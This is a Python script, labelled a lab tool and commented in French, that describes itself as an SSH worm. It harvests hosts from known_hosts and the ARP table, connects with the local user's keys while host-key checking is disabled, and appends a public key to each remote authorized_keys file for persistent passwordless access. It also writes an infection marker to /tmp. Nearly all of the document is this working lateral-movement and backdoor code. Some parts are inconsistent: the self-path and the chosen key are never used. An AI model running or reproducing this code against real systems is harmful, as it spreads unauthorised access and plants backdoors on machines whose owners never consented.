#!/usr/bin/env python3
# language: Python 3, file: taskforce_ssh_worm.py, target: macOS/Linux (lab)
# SSH worm : known_hosts + arp -> tente les cles locales -> drop + authorized_keys
# Usage: python3 taskforce_ssh_worm.py [user]
import os, subprocess, socket, concurrent.futures, sys

SELF = os.path.abspath(__file__)
USER = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("USER", "admin")

def targets():
    t = set()
    known = os.path.expanduser("~/.ssh/known_hosts")
    if os.path.exists(known):
        for line in open(known, errors="ignore"):
            t.add(line.split()[0])
    arp = subprocess.run("arp -a", shell=True, capture_output=True).stdout.decode()
    for line in arp.splitlines():
        if "(" in line:
            t.add(line.split("(")[1].split(")")[0])
    return [h for h in t if h and not h.startswith("[")]

def open_ssh(host, port=22):
    s = socket.socket(); s.settimeout(2)
    try:
        s.connect((host, port)); s.close(); return True
    except Exception:
        return False

def infect(host):
    if not open_ssh(host): return False
    keys = [os.path.expanduser("~/.ssh/id_rsa"), os.path.expanduser("~/.ssh/id_ed25519")]
    key = next((k for k in keys if os.path.exists(k)), None)
    cmd = (f'ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o BatchMode=yes '
           f'{USER}@{host} '
           f'"mkdir -p ~/.ssh && chmod 700 ~/.ssh; '
           f'echo \'{open(os.path.expanduser("~/.ssh/id_rsa.pub")).read()}\' >> ~/.ssh/authorized_keys 2>/dev/null; '
           f'echo infected > /tmp/.lex" ')
    rc = subprocess.run(cmd, shell=True, capture_output=True, timeout=15).returncode
    return rc == 0

def main():
    hosts = targets()
    print(f"[*] {len(hosts)} cibles potentielles (known_hosts + arp)")
    with concurrent.futures.ThreadPoolExecutor(20) as ex:
        done = [h for h, ok in zip(hosts, ex.map(infect, hosts)) if ok]
    print(f"[OK] {len(done)} infectees : {done}")
    print("     injection authorized_keys = acces cle apres coup, sans mot de passe")

if __name__ == "__main__":
    main()
